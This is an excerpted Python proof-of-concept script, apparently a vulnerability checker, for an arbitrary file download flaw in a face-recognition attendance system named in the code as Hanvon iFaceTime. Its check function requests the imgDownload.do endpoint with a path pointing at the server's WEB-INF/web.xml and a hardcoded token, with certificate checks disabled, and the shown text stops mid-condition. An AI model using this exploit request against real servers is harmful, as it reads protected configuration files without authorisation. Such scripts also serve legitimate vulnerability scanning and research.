...
def main():
    ...
    parser = argparse.ArgumentParser(
        ...
        epilog=textwrap.dedent("示例：python yueyue_nullvisit.py -u http://127.0.0.1")
    )
...
def check(url):
    full_url = f"{url}/manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS"
    headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
'Accept': '*/*',
'Connection': 'Keep-Alive'}
    try:
        response = requests.get(full_url, headers=headers,timeout=5, verify=False)
        if response.status_code == 200 and 'Hanvon iFaceTime System V1.0' in response.text:
